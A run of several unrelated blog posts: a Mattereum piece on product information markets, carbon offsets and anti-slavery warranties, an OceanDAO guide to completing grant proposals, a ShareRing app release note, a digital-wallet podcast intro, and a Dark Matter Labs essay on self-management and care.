throughout our agriculture, infrastructure, and general quality of life now and in the future — we can view this by-product of trade as contributing to suffering in the&nbsp;world.</p><p>Despite the threat, there’s plenty of greenwashing and CSR/ESG theatre from the corporate sphere, as well as gaslighting of the populace.</p><p>Global coordination to avert the worst-case scenarios in the future is a combined policy, social, and technological challenge: a veritable “<a href="https://en.wikipedia.org/wiki/Wicked_problem">wicked problem</a>.” Policy and social awareness are beyond the scope of this article, so let’s look at supportive solutions on the tech&nbsp;side.</p><p>Even though we have carbon calculators for individuals and businesses alike as well as marketplaces for purchasing carbon offsets, there still lacks a fine-grain accounting of C02 and energy costs across all of industry.</p><p><a href="https://www.carbonfootprint.com/calculator.aspx">Carbon Calculator</a></p><p>For assets secured by the Mattereum Protocol, carbon offsets can be purchased through third-party marketplaces and be warrantied within the Asset Passport. For products which emit carbon throughout their lifecycle — such as gas-powered vehicles — multiple offsets can be purchased and warrantied over&nbsp;time.</p><p>In a future where net-zero products gain a premium over non-net-zero goods and services due to demand and possibly mandate, Trust Communities can help facilitate Product Information Markets for end-to-end carbon accounting of trade and push us further to a greener future. Decentralizing this process is necessary to maintain accountability for all parties involved — in particular corporations and governments which have the largest carbon footprints and therefore the most responsibility.</p><p>Slavery</p><p>The most pernicious and hidden suffering of trade globalization lies upon the millions of slave laborers which exist in the world today. While exact numbers are of course impossible to count, the ranges estimate the total number of slaves in the world today to be 20–40 million, with 10 million estimated to be children and the vast majority being women and&nbsp;girls.</p><p>The clothes on our backs. The minerals in our smartphones. The likelihood of anyone reading or writing this not owning a product touched by a slave is incredibly slim. The truth is that throughout the global supply chain, there are shadowy areas far removed from the corporate offices or warehouses where material and labor is sourced by stripping the basic rights and dignity of other human&nbsp;beings.</p><p><a href="https://slaveryfootprint.org/">Slavery Footprint</a></p><p>While fair trade products are prevalent, they are limited in number and scope. In reality, slavery-free trade and decent labor conditions should be the standard mode of industry rather than a unique offering.</p><p>Similar to climate, the path forward for meaningful systemic change will be a combination of progressive policy, social awareness, and technological innovation.</p><p>On the tech front, Mattereum is actively researching and developing methods of warrantying anti-slavery certification. In practice, an independent, expert individual or firm within a Trust Community could investigate the supply chain of a particular product for any labor abuses, either supplying the warranty or checking an active claim if there is any suspicion on its authenticity.</p><p>The exact implementation of this is a work in progress, but we are joined in the effort by human rights activist and anti-slavery expert Helen Burrows to design the process in the context of the Mattereum Protocol.</p><p>This work is a culmination of decades spent thinking on how to manage scarce resources on the planet such that people’s basic necessities of living are secured, even in the worst of situations.</p><p>For a longer read, Mattereum CEO Vinay Gupta distilled his insights on the technological and social transformation of material culture in his book, The Future of Stuff, where he explores how material culture has made monsters of us all and how we can build a better path forward where humanity can live in equilibrium with the planet at the expense of no&nbsp;one.</p><p><a href="https://www.amazon.com/Future-Stuff-Vinay-Gupta-ebook/dp/B08B4F5QK3/ref=sr_1_1?dchild=1&amp;keywords=the+future+of+stuff&amp;qid=1632531819&amp;sr=8-1">The Future of Stuff</a></p> Better Markets Make a Better&nbsp;World <p>The potential of Product Information Markets as described here is a reformation, rethinking, and possibly a path to redemption for the markets consuming the world today. If taken to the nth degree, Product Information Markets could create a multi-dimensional pricing mechanism beyond supply and demand: energy costs, material costs, C02 emissions, labor hours, worker conditions, etc. Imagine if we were able to index and filter markets along these lines. We could virtually eliminate fraud, piracy, environmental harm, and root out human rights abuses all across the&nbsp;world.</p><p>With this information at hand, people could engage in material culture in a way that does not conflict with their core principles. They can even configure tools to prevent them from contributing to negative externalities like accidentally buying products with unchecked carbon emissions or slaves in the supply chain: automated morality systems that overcome the mental transaction costs of simply not doing harm to society.&nbsp;.</p><p>This vision of a market economy which incentivizes truth and prices out societal harm does not require central command economies, heavy bureaucracy, or some undiscovered paradigm-shifting technology.</p><p>It simply demands a will to change, and the technology to make sure that people’s decisions are correctly implemented.</p><p>About Mattereum</p><p>London-based Mattereum was established in 2017 by a trans-disciplinary team with a track record in designing and launching nation state-level infrastructure and headed by former Ethereum release coordinator Vinay Gupta. With blockchain-enabled authentication and tokenization of physical assets with built-in legal guarantees, Mattereum removes the fear, uncertainty, and doubt that has plagued digital commerce for&nbsp;decades.</p><p>Follow us as we bring the Mattereum Protocol to an expanding variety of markets ranging from memorabilia, gold, wine, to prized classical instruments, and&nbsp;more.</p><p>More at: <a href="http://www.mattereum.com/">http://www.mattereum.com</a></p><p>Twitter: <a href="https://twitter.com/mattereum">https://twitter.com/mattereum</a></p><p>Telegram: <a href="https://t.me/mattereum">https://t.me/mattereum</a></p> <p><a href="https://medium.com/humanizing-the-singularity/bringing-truth-to-market-with-trust-communities-product-information-markets-d09fb4a6e780">Bringing Truth to Market with Trust Communities &amp; Product Information Markets</a> was originally published in <a href="https://medium.com/humanizing-the-singularity">Mattereum - Humanizing the Singularity</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>An explainer on how to complete proposals and improve your runway in OceanDAO&nbsp;grants.</p> 1. Introduction <p><a href="https://blog.oceanprotocol.com/introducing-oceandao-efe9ed681b84">OceanDAO</a> is a community-curated grants&nbsp;DAO</p><p>In OceanDAO, there are humans on the other side voting for your team’s proposal. They’re assessing your team’s ability to deliver, using track record in previous grants as a key guide. This can be subjective as there is a wide range of possible targets. We need something that is flexible enough to handle OceanDAO now has mechanisms to report and assess track&nbsp;record.</p><p>This post is a guide for you, as a project team, about OceanDAO Funding Levels, <a href="https://oceandao.notion.site/Project-Standing-a26be0e2054e4927ab5ab8e7bde8558f">Project Standings</a>, <a href="https://oceandao.notion.site/Project-Standing-a26be0e2054e4927ab5ab8e7bde8558f">How To: Submit an Update</a> and complete your proposals,</p><p>The rest of the post is organized as&nbsp;follows:</p>  Section 2 onboards the user to the grant&nbsp;program.  Section 3 describe the different funding levels accessible by DAO participants.  Section 4 covers Project Standings.  Section 5 provides different examples on submitting and completing proposals.  Section 6 talks a bit about the&nbsp;future.   2. Completing Grants <p>If you are learning how to write a proposal, working on submitting a proposal, or perhaps have already been funded, then this blog post may help you improve how to coordinate with the&nbsp;DAO.</p><p>If you want more context, you can read here <a href="https://github.com/oceanprotocol/oceandao/wiki#steps---summary">How To: Submit a Proposal</a>. You can also visit our <a href="https://oceandao.notion.site/Project-Standing-a26be0e2054e4927ab5ab8e7bde8558f">Project Standing</a>&nbsp;page</p><p>We’ll be focusing on the Grant Deliverables parameters inside the <a href="https://github.com/oceanprotocol/oceandao/wiki/Grant-Proposal-Template">Grant Proposal Template</a>, and how to reconcile your grant with the DAO. You may be familiar with <a href="https://port.oceanprotocol.com/">Ocean Port</a> at this point, and how to submit a new Proposal.</p>Submitting a Grant Proposal (using the template) into Ocean&nbsp;Port. 3. Funding&nbsp;Levels <p>So, why should you complete your proposals?</p><p>With the introduction of a Proposal Update mechanism, enables the DAO to signal the delivery of their work and completion of a grant. This in turn, allows teams to return to the DAO and ask for more&nbsp;funding.</p><p>As teams complete on their promises, continue to drive towards ROI&gt;1, and receive funding, their funding ceiling may go up, enabling them to increase their roadmap, or scale with more impunity. It is up to each Individual|Team|Project|Business|Organization|DAO to effectively manage their treasury.</p>Completing proposals gives teams access to greater&nbsp;funding. 4. Project&nbsp;Standing <p>The second reason to submit an update, and complete your proposal, is to maintain a good project standing. We’ll keep this post simple, and focused on what’s most important: getting to&nbsp;green.</p>Different project states. You need to be in the green to apply for a new&nbsp;grant.<p>As soon as the round concludes, funded projects receive the “Unreported” standing and they have 3 months to submit an update. Your standing needs to be in the green to apply for additional grants.</p> 5. Submit Updates &amp; Complete&nbsp;Grants <p>Our goal then is to get from our ⬜️Grant Deliverable promise, to a ✅️Completed state.</p><p>This is very easy to do once you have submitted your proposal. You just reply to your original proposal inside of Ocean Port, with an explanation of the work completed, and <a href="https://stackoverflow.com/questions/47344571/how-to-draw-checkbox-or-tick-mark-in-github-markdown-table">all checkmarks set to completed</a>.</p>Submit a proposal to receive funding. Reply to your proposal to update and complete&nbsp;it.<p>Identifying what to write and how to reconcile the grant might be a bit more challenging. This post tries to provide insights into a few different examples, to make some initial recommendations.</p> New Proposal <p>You will first start by submitting your proposal to <a href="https://port.oceanprotocol.com/">Ocean&nbsp;Port</a>.</p><p>For the sake of this blog, we’re going to be forming a Data Union that collects images of people giving each other high fives. Participants that submit new high fives receive $FIVE tokens as a reward. The project name will be “Awesome Data&nbsp;Coop”.</p><p>Good enough for&nbsp;now.</p><p>We submit our proposal which includes many details, including considerations for ROI&gt;1, and provide multiple Grant Deliverables that will receive funding. We also provide some estimates.</p><p>High Five!</p>For the remainder of the blog we’ll be providing examples based on this submission. Submit Update — Completion <p>Since our team of super shadowy coders estimated everything perfectly and delivered on time, we share details about what we have delivered, point to results and outcomes, and share our next steps towards&nbsp;growth.</p><p>Our Project Standing will remain Complete if no one Disputes our&nbsp;update.</p><p>We should be on our way to submitting another proposal to further our web3 contracts, deploy a DAO, and begin farming high&nbsp;fives.</p>High Five! Submit Update — Reconciliation <p>In this scenario our team did not hit all their&nbsp;goals.</p><p>Although we completed the Technical Design, and UX Wireframe, we ran into challenges building the dApp. As a young team, we underestimated the work ahead and ran into more work than anticipated.</p><p>That’s ok, we got a lot of the frontend and smart contracts delivered to provide a basic MVP in testnet. We explain how the funds were used to generate this first deliverable, we communicate a new plan which is composed of 3 phases, and set the deliverable to complete.</p><p>Our Project Standing will remain Complete if no one Disputes our update and reconciliation.</p>High Five! Submit Update — Refunding <p>In this scenario our team bit more than it was ready to&nbsp;chew.</p><p>We got a Technical Design, and UX Wireframe out the door, but we’re not too happy with it. More importantly, our initial R&amp;D showed technical limitations based on the original methodology we planned to use. Further to that, our lead engineer quit the&nbsp;project.</p><p>At this point, we feel that it would be most constructive to retire the project, and refund the&nbsp;grant.</p><p>After sending the funds back, our Project Standing will remain Refunded if no one Disputes our update and reconciliation.</p>Low Five!<p>Although refunding is an acceptable means to provide a resolution, we believe there are more constructive ways to empower teams to&nbsp;succeed.</p> Submit Update — Pivot <p>In this scenario, we experienced all of the same problems as the example&nbsp;above.</p><p>However, instead of sending the funds back, we are pivoting the project and using the funds to bootstrap our next&nbsp;project.</p><p>Since we have some remaining funds, we’ll take them into consideration in our future proposal. We have already been open with the community about these challenges, so we link to the new Proposal that further explains the&nbsp;pivot.</p><p>Our Project Standing will remain Completed if no one Disputes our update and reconciliation.</p>High Five!<p>We should anticipate most projects to fail. Teams that succeed will provide asymmetrical ROI. For these reasons, we should support projects as much as possible to reconcile their deliverables and continue building.</p> 6. Ok, so what’s&nbsp;next? <p>As OceanDAO evolves, higher Funding Levels and different eligibility criteria might be introduced to further increase the funding&nbsp;ceiling.</p><p>Projects building in OceanDAO should continue to build, create traction, increase their <a href="https://github.com/oceanprotocol/oceandao/wiki/On-ROI#whats-a-good-metric-for-bang">bang</a>, receive funding, and speed up their flywheels.</p><p>Furthermore, OceanDAO projects will be able to update their proposals and manage their Project State more easily. As an example, <a href="https://oceanpearl.io/">Ocean Pearl</a> is working to improve the UX, and the OceanDAO Engineering team is working closely with them to implement these features.</p>Ocean Pearl landing&nbsp;page<p>Until then, please continue to submit updates, and complete your proposals!</p><p>High Five!</p><p>…</p><p>Follow Ocean Protocol on<a href="https://twitter.com/oceanprotocol"> Twitter,</a><a href="https://t.me/oceanprotocol_community"> Telegram</a>,<a href="https://www.linkedin.com/company/ocean-protocol/"> LinkedIn</a>,<a href="https://www.reddit.com/r/oceanprotocol/"> Reddit</a>,<a href="https://github.com/oceanprotocol"> GitHub</a> &amp;<a href="https://oceanprotocol.com/newsletter/"> Newsletter</a> for project updates and announcements.

<p>As it continues to emerge, policy makers “will play a meaningful role in the direction and pace of this transformation by providing clarity on data protection expectations, data privacy requirements and consumer data rights.”</p>

<p>This week marks a major milestone in our development of the ShareRing ecosystem. After 3 years of tireless planning, building, rebuilding, testing, and re-testing, we have submitted v1.0 of the ShareRing app to the Google Play, Samsung Galaxy, and Apple App stores.</p>



<p></p>



<p>This blog will help to detail what’s included in version 1.0 of the app, as well as give you a hint at what’s to come.</p>



<p></p>



<p>Before we get into the details, let’s get one thing out of the way. Staking and Swapping is NOT included in this version of the app. Our commitment to our corporate clients to release the app for eKYC and ShareRing Access required us to de-prioritise it for this release. Rest assured though, it will be added to the next version of the app within the next 6 weeks. I’m sure that you would all agree that ‘real world’ usage needed to take priority in this case.</p>



<p></p>



<p>What’s included in v1.0 of the app:</p>



  ShareRing ID sign up, which includes;  ID Card, Passport and Driver’s license scanning and checking for over 2500 ID types from around the world.  Face-match and liveness detection.  Document proof (digital hash) stored on the blockchain    



  eKYC sign-up, ID and document solutions for financial institutions.  



  ShareRing Vault, which includes  Storage and document proof of self-sovereign identity documents  Storage and document proof of Health Documents  Storage and document proof of address verification    



  ShareRing Access  For supported events and venues, you can gain express entry by scanning the ShareRing QR code at the entrance. We are currently piloting this and will roll it out in select locations over the coming months.  Along with ShareRing Access is the Web App that is available for venues and events to successfully verify identity, age, or health status of customers that enter.    



  SHR Wallet  This has limited functionality until staking and swapping is activated.    



  Document Issuance  One of the supporting apps for the ShareRing ecosystem is our Document Issuance app. This is a versatile app that’s used by document issuers such as the health centers, credit unions, etc. It allows them to scan and digitally sign any ‘verified at source’ documents that are added to your ShareRing Vault. A full explanation on ‘Verified at Source’, ‘Self Verified’, and ‘ShareRing Verified’ will be published in the coming weeks.    



<p></p>



<p></p>



<p>What’s on our roadmap:</p>



<p>This list is in no particular order and may change based on external priorities, but here is a subset of the main features and products that we are adding over the coming months.</p>



  Offline Access – During our pilot tests of ShareRing Access we identified improvement opportunities for areas with low/no cellular coverage. Our solution is Offline Access. This provides the same level of functionality as the existing ShareRing Access, but will work without any cellular network.  



  Staking – Staking is complete and going through some final regression testing. There’s one small issue with how we’re displaying transaction history in the app, but the rest is working well.  



  Swapping – We have redesigned our swapping functionality to utilise smart contracts for the SHR/ERC20 swaps. This is expected to be ready for internal testing within the next couple of weeks. We will test and release it soon after.  



  ShareRing Payments – We have put a huge amount of work into our payment system, including the regulatory hurdles required to ensure we do this properly.  



  Accommodation – Our ShareRing Travel system moved into user acceptance testing (UAT) today. The next step after testing is complete, is to gain certification from Rakuten Travel Exchange, before launching in Q4 of this year. We will add the express check-in functionality after the initial accommodation rollout. This will be activated in parallel to a number of travel destinations opening for business.  



  Smart Contracts for ShareLedger – When we activate the smart contracts module on ShareLedger, anyone will be able to build their own DAO that takes advantage of the protocols that we have built for identity, access, ShareRing Vault, NFT’s, or DeFi.  



  Dependants – ShareRing Vault will be updated to allow you to add any dependents (such as children) to your vault. This will be beneficial for Visa applications, Travel bookings, Event access, and many other areas.  



  Activities – Through our partnership with a world’s major activities provider, we will be allowing you to book activities, such as cooking classes, tours, fishing trips, etc through the ShareRing App.  



  QR Code Issuance – A completely offline ShareRing ID experience for people without smartphones.  



  eKYC v2.0 – An enhanced KYC experience with expanded functionality for insurance companies and financial institutions.  



<p></p>



<p></p>



<p>We are very excited and proud of this initial release of the ShareRing App, and we look forward to welcoming you on our journey as we build out our ecosystem.</p>

<p>Introduction</p>
<p>This episode features a live recording of an <a href="https://www.meetup.com/indicio-identity-community/events/280323809/">Indicio community event</a>. </p>
<p>Digital Wallets are taking off! OS operators such as Apple are starting to support open standards for digital credentials (<a href="https://spec.smarthealth.cards/">here</a>). Technology disruptors (like the companies represented in this episode) are taking wallet solutions to market (<a href="https://northernblock.io/products/ssi-digital-wallet/">here</a>).</p>
<p>This objective of this discussion is not to take a deep dive from a technical perspective, but more from an adoption standpoint.</p>
<p></p>
<p>This image was taken from a presentation on Digital Trust. If you’re looking for a better framing on SSI and Digital Trust, we wrote an article to hopefully help you better articulate it <a href="https://northernblock.io/introduction-to-digital-trust/">right here</a>.</p>
<p>About Episode</p>

 Distributed Agency, Distributed Care <p>This piece was authored by a member of the Dark Matter Labs team based in the UK as part of the #BeyondtheRules project and, as such, is written in British English and has particular references to contexts in the&nbsp;UK.</p><p>This blog was written in September 2021 and reflects our learning at that&nbsp;time.</p> Our Context <p>In a context of climate breakdown and technological disruption, Dark Matter Labs works to accelerate societal transition towards collective care, shared agency, long-termism and interconnectedness. We focus on the dark matter — the invisible structures responsible for producing the majority of the world around us, from policy and regulation to finance and data, governance and democratic participation, organisational culture and identity. What we seek to build in the wider world we look to create at a smaller scale in how we organise together.</p><p>Our context as an organisation, and from which the learning that we share here is anchored, is largely defined by&nbsp;being:</p>  A platform for shared&nbsp;missions  Focused on discovery and&nbsp;learning  International with a planetary view  Primarily virtual  Evolving constantly  <p>See <a href="https://darkmatter-labs.medium.com/organising-beyondtherules-at-dark-matter-labs-e59e4f5dd32f">blog 1</a> in this series for more information on our context and current structure.</p><p>A distribution of agency is a defining feature of how we organise and this blog aims to explore that in detail. When I use the term ‘agency’ here I mean the distribution of power and of autonomy and also the correlating responsibility, accountability and risk-holding that sit alongside them (for a deeper exploration on these elements and how they sit alongside each other see <a href="https://provocations.darkmatterlabs.org/beyondtherules-balanced-governance-and-behaving-well-everywhere-every-day-5aa852b4843e">this blog</a>). We will&nbsp;cover:</p>  Our system of self-management  Legal and financial risk&nbsp;holding  Accountability  Decision-making and community organising  The relevance of&nbsp;pay  <p>We have found that a system of distributed agency unchecked can also have a propensity to compound existing inequalities in a system (and/or create potential harm), and we look to counteract this with a platform of deep care, security and safety that underpins our work together. We will explore what this looks like in the areas&nbsp;of:</p>  Care as a foundation for our&nbsp;work  Self-management of time and minimum&nbsp;rest  Distributed acts of&nbsp;care  Training and Structural support  Clean feedback   Self-management <p>DML as a self-managed organism. For us this means that each of us takes responsibility for our agency in the system — our agency is not predetermined by a position or&nbsp;‘rank’.</p><p>When it comes to our roles and responsibilities, these are not our job ‘title’ but more like a hand of cards that we hold at any time and that regularly may change (see more on this in blog 2 to this series). We can choose to change these, whilst we ensure that the responsibilities are handed over to someone who is also happy to take them&nbsp;on.</p><p>The scope of each of our work varies per person — some may be focusing on the scope of a project, some on a series of projects, some at the scope of a mission and some at the scope of the whole organism of DM. As such, we do not consider that there is no hierarchy, but rather a dynamic hierarchy that is dependent on what makes sense for individuals and the wider system at any given&nbsp;time.</p><p>We each have the autonomy to decide how a piece of work that we hold/steward is done (whatever its scope) within the parameters of the shared mission that we have, the agreements that we make to each other and any contractual terms. We all hold/steward different pieces of work with a range of scope and negotiate with each other how they fit together.</p><p>Some hold clearer roles to drive forward improvements to how our shared operational system works and are more likely to lead this, although anyone can craft and propose changes/directions into our shared system (and shift into these&nbsp;roles).</p><p>High autonomy and high choice are balanced with the responsibility that each of us hold for what we propose and accountability for our work. This means — among many things — taking on workload, exposing our reputations, showing up when things go wrong, explaining our decisions, accepting failures. Genuinely stepping into this agency requires each of us to show up and face reality head-on, and that can be emotionally difficult and mentally demanding, compared to having a bounded responsibility within a system where blame can be passed up the chain. We notice that this way can also be much more effective, rewarding and liberating.</p><p>Our bandwidth to take on the emotionally and/or mentally demanding aspects of high agency is naturally influenced by the situations that we are each in at that time and the structural conditions that affect them. We have learned that choice alone as a system to determine personal agency is one that readily compounds existing structural and personal inequalities and privileges.</p><p>At an organisational level, we cannot redress the structural impact of a socioeconomic system. We can, however, aim to embed our shared platform within a culture of deep care, which nourishes people to step into their full agency (whatever that means to them, including the boundaries they put to that) and seeks to counteract underlying imbalances.</p> Legal and financial risk&nbsp;holding <p>A system cannot thrive where power and autonomy are distributed but risk-holding is concentrated. And yet, when it comes to legal and financial risk-holding, our methods to distribute this are heavily constrained by the external rules of the systems that we sit in, such&nbsp;as:</p>  The legal companies through which we operate require Directors who take on the legal responsibilities of company records and accounts, with the risk of being fined, prosecuted or disqualified if not completed fully or correctly.  Some banking systems will only allow banking access for companies with Persons of Significant Control  Loans may require signatories to agree to take on the financial liabilities of the&nbsp;lending  <p>In traditional hierarchies, the people holding these risks normally also have the decision-making power to control the company, and they are both responsible and accountable for the company&nbsp;risks.</p><p>We seek to fully comply with the rules of the system whilst also being true to the principles of how we organise. We currently organise around this as&nbsp;follows:</p>  Directorships are held by ‘legal stewards’ who hold the official risks of a DM company (or companies, when more than one) as one of their roles. They have the minimum powers that they need to fulfil their legal duties as Directors, such as to veto any large decision that might expose them personally to significant risk as Directors or contradict their duties (we have not yet faced such a scenario but might one day), without playing a control function for the&nbsp;company.  Day-to-day decision-making is held by people across the ecosystem, and de facto risk holding is shared as much as possible to not create unnecessary risk liabilities on the legal stewards.  <p>Let’s take the example of financial cash flow risk to illustrate what this looks like in practice. Normally in a small not-for-profit the executive team might make a plan in the case of cash flow risk, and it’s not uncommon for them to temporarily forfeit payments if it were needed during a cash flow crisis to ensure that others are paid. Distributed risk management at DM means that in a cash flow risk scenario:</p>  an approach and decisions for cash flow management are made by a finance group who can decide on behalf of the whole following sense-making with the full&nbsp;team  The shouldering of financial implications is distributed more widely across the system among those who nominate themselves to hold more&nbsp;risk  <p>For example, when we recently faced an issue following a large receivable falling overdue — impacting our payments for a number of weeks — the Finance Holder at DM called an (optional to attend) All-Hands meeting to lay-out the situation and our options to the whole team, and to invite shared approaches. On that occasion, a proposal was made, evolved live and collectively agreed upon, whereby an absolutely no pressure invitation was made to anyone who would be happy to provide a 0% interest loan for a short fixed period of time. By the end of the day, 6 loans were made for 3 weeks which brought all of our outgoing payments back on track. There was a lot of care in the specific details of how this was structured and communicated — including the emphasis on only offering where someone was comfortable to do so; the non-glorification of loan-making; the details of the loans and loan-makers kept anonymous. These loans were all fully repaid on banking the overdue receivable invoice and the feedback from the teams across DM around this process was notably positive.</p> Accountability <p>As explored by Ebrahim and Weisband in Global Accountabilities: Participation, Pluralism, and Public Ethics (2007), in a ‘principal-agent’ view of accountability, accountability involves individuals or groups reporting to a recognised authority(ies) to justify their behaviour, be scrutinised, and the possibility for a penalty to be imposed. Its core components include transparency, justification, compliance and sanctions, with the capacity for sanctions being an important part of retributive justice. This approach requires there to be an agreed relationship between power-wielders and those holding them accountable, and a shared understanding of the standards of behaviour that they are accountable to.</p><p>Without a hierarchical vertical structure of power in a system, the embedded binaries of power-wielder and accountability-holder make less sense. When our work is based on relationships of care, the capacity for punitive retribution becomes much less of a&nbsp;concern.</p><p>We are starting to put together a draft thesis on what accountability means for us, although we still have much more work to do on this. So far, we recognise that our accountability sits at various&nbsp;layers:</p>  Accountability to ourselves (what we choose to commit our time to, our families, needs, passions)  Accountability to each other (in caring for each other and distributing governance fairly between us and following up on things that we committed to)  Accountability to our shared missions (to whether the way we set our intention and spend our time brings us collectively towards the missions that we&nbsp;share)  Accountability to the living world (to the choices that we make and how these affect the human and non-human world that we are in balance&nbsp;with)  Accountability to future generations (to the human and non-human populations of the future who are impacted by the choices that we make&nbsp;now)  <p>These show up in many different ways:</p>  Part of the embedded training for the team is around setting your personal boundaries and learning to hold them, holding yourself accountable to your needs. People at DM have manifested this in various ways such as personal and self-declared time tracking followed by an analysis of time spent which is declared to the&nbsp;team.  Our clean feedback processes allow us to raise issues of accountability to each other directly, with&nbsp;care.  We are each accountable for our decisions and approaches, and Working Out Loud (see <a href="https://provocations.darkmatterlabs.org/organising-beyondtherules-at-dml-2-4-ef87a1e466c">blog 2</a> on this) helps to make that transparent  Where there are ongoing issues with accountability from someone in the team that is beyond a 1:1 relationship, a team can be invited to support a process of more structured wider feedback to explore together where a misalignment lies.  Our projects have project-holders, contract holders and budget holders who are considering deadlines, taking care that we meet terms and keeping on track financially. These are roles that people hold (for now), not their identity or their rank. They can hand these responsibilities over or evolve them, according to what makes the most sense for them and the system. They hold any accountability needs of partners, funders and others with whom we work around our shared performance and compliance, where&nbsp;needed.  Our legal stewards hold accountability for the overall progress of each respective company.  <p>Being self-managed does not mean ignoring accountability or risk in a system. Rather, accountabilities and risks align to the scope of responsibility, power and autonomy in our roles (with higher or lower degrees in different roles); and that these roles are cards that we hold at any given time, and can&nbsp;change.</p><p>We still have a lot of work to reimagine what accountability means for us in detail, and to embed more deeply into our work. We hope to bring in place intentional structures and processes for this in the coming 6&nbsp;months.</p> Decision-making &amp; community organising <p>Making decisions in a self-managed organism might sound like one of the trickier areas to get right, and in some ways it is (particularly when this way of working is less familiar), and in other ways it can also be very&nbsp;natural.</p><p>It’s a bit like making decisions within a family setting wherein the person who — say — handles the cleaning wouldn’t ask for advice or permission each time they clean a surface, although they might check for objections before they throw paperwork in the bin, and if they wanted to hire a cleaner there would be a discussion together before going ahead, weighing up the options and finding the best approach. These options of advice, consent, co-sensing &amp; consensus play out organisationally in similar ways. Most day-to-day decisions (clean a surface) with relatively minor implications are taken by the people closest to the questions — that might mean one person takes a decision, or that they take advice from others close to the question and then make a decision. They would declare these decisions if they are significant, and others would have the chance to object if they expressly disagree. Feedback can also be given through the clean feedback method so that issues or disagreements can be discussed directly.</p><p>Decisions with a medium level of impact would start involving more of a community organising approach.</p><p>For example, the decision of setting up a new international payroll system affects many people and affects our shared finances. We start by researching the options, speaking to providers, finding out services that they do, don’t provide, costs, ease of use, process etc. This allows us to gather an overview of the options available and their potential impacts. We then speak to the people that those options might impact (those holding responsibility for parts of the delivery, or responsible for finances who would need to factor in costs) and gather their insights. We then find out how many people it would impact and in what ways — reaching out to those individuals (via a survey, or directly, as appropriate). We gather all of this information together and work out options in terms of an approach — we would weigh these up against the kind of world that we want to bring into being. We would then invite all of those affected/all interested or the whole team and present all of the findings. At this point, depending on the specifics, we might use one of a few approaches:</p>  Propose an approach using a process such as Percolab’s <a href="https://medium.com/percolab-droplets/generative-decision-making-process-cf0b131c5ac4">Generative Decision-Making</a>, if there were a clear favourable option on the table,&nbsp;or  Ask for opinions across a sliding spectrum, with comments, if there is not an obvious best approach. We would ask people about their fields of tolerance to find where the least contested option&nbsp;is.  <p>This would either give us a way forward (in the former) or a shared direction (in the latter) that the responsibility-holder can take forward to implement.</p><p>Decisions that are more complex and affect us all more deeply normally involve a co-sensing approach. This might involve facilitated discussions from space holders to explore the topic in detail, wherein we can get a better feeling of the question by listening to different perspectives to it, hearing how different people experience it, and exploring all its connections together so that we can get a shared sense of the interconnectivity of the question. At that point we may be able to progress with a process of consent rather than consensus — rarely do we feel that we need to all agree on what the best decision is, as long as it is within all of our realms of tolerance. However, in some cases where people would be deeply affected (a change in purpose, say) we would agree by consensus.</p><p>Making these methods clear and legible to assist people to navigate DM is work that we still need to&nbsp;execute.</p> The relevance of&nbsp;pay <p>Our pay formula — decoupled from rank or role (see more on this in blog 1 to this series) — is an important foundation for our system of self-management, distributed decision-making and moving roles. It means that people can genuinely choose and agree upon their roles, projects and responsibilities in any given scenario based on what makes the most sense, without it having an impact on their pay. This also invites them to step back (and, sometimes, get out the way of others) in decisions and situations when they might not be closest to the problem, without it creating a perceived negative implication to pay, prospects, roles etc. It frees all of us to take up less space as much as it does&nbsp;more.</p><p>Despite various flaws in its current form, it inherently incentivises us to collaborate, care and be effective rather than to compete for positions or resources and thus is an important foundation for this way of&nbsp;working.</p> A platform of&nbsp;care <p>When we recognise that people are creative, caring beings who want to commit their time to things they care about and do so in a way that improves our shared conditions, our preoccupation comes not with how we can control them but how we can care for them in a way that enables them to do&nbsp;this.</p><p>This might&nbsp;mean:</p>  Structurally creating space for the other commitments that are important to each of us (see e.g. self-management of&nbsp;time)  Inviting each other to improve and grow, particularly where we might have habits or behaviours that can cause harm (see e.g. clean feedback)  Recognising that each of us has barriers, traumas, enablers in our routes to this, and may need care as we work through them (see e.g. training and structural support)  ‘Seeing’ each other and the labour and care that we put into this (See e.g. clean feedback)  <p>Our work at DM is uncertain and complex and invites us to think daily about some of the existential questions that we face. It invites us to inspect what influences how we show up, such as what triggers us in our work relationships and where those triggers might stem&nbsp;from.</p><p>This might be coupled with challenging situations in other areas of our lives, and not forgetting the last 20 months amid a pandemic, which for many of us has had huge implications including on mental&nbsp;health.</p><p>If there is anything important in how we show up together, it’s the care, understanding, mutual support and realness with how we do&nbsp;it.</p> Self-management of time and minimum&nbsp;rest <p>The ability for each of us to manage our own time — including our working schedules and also our time off — is a foundation part of&nbsp;this.</p>  Our holiday policy is currently structured with a minimum holiday per year and no maximum. It invites each of us to take the rest that we need and to structure it in ways that work for&nbsp;us  Each of us is able to set our working schedule according to what we need to be effective (there are no ‘core mandatory hours’, for example, and people might fluctuate between 9–5, ‘oxford hours’ with a long afternoon break, a mix of day and night working, or indeed whatever hours work for them, ensuring it is viable for their work and&nbsp;teams)  <p>This invites us to create a balance in our lives that enables our creativity and ensures that we have rest. It also fundamentally recognises that we are all caring and decent adults who know best what we need and who want to do well by each&nbsp;other.</p><p>This is certainly evident from how this policy works in practice, Despite an unlimited holiday policy, our main collective challenge is in people take the minimum amount of time off to properly&nbsp;rest.</p><p>Since autonomy is also deeply linked to responsibility, for many people at DM their commitment and care to the missions mean that taking time off can seem to be at the cost of not doing work to the quality that we want to, or leaving colleagues with high workloads. Cultural norms also play a role in the rest we take, where some cultures embrace long periods rest and others revere ongoing&nbsp;work.</p><p>Active peer encouragement helps but we have found is not enough to create equity in rest, and we are currently exploring measures to ensure that enough rest can be a genuine option for everyone at DM, such as by bringing in two periods (in summer and winter) a year where we actively discourage work to be scheduled so that the team can more easily plan holidays, and rewording of the policy so that the invitation to take holiday particularly speaks to people who have not been accustomed to this as a&nbsp;norm.</p> Distributed acts of&nbsp;care <p>As a group of people who generally recognise the importance of care for each other, people who are struggling are likely to be spotted and supported by those who interact most with them. This support might mean helping them to take time off, sending thoughtful gifts or offering to talk through matters or distribute workloads. We recently decided collectively to create a common pool care pot of funds, which everyone can access to use to spend on other team members whenever they spot someone needing&nbsp;support.</p><p>These acts are valuable and important, although alone do not address the deeper care and structural support that we may&nbsp;need.</p> Training and Structural support <p>A year ago we brought on a specialist coach and trainer who provides a range of training and group coaching around some of the key capabilities for self-management and agile teams. This includes:</p>  Clean language and clean&nbsp;feedback  Learning from&nbsp;emotions  Creating and holding boundaries/limits  Time management  Choosing and noticing attention  <p>This training has been fundamental in helping us as a group of individuals to practice some of the behaviours and habits that come with a self-managed and agile way of 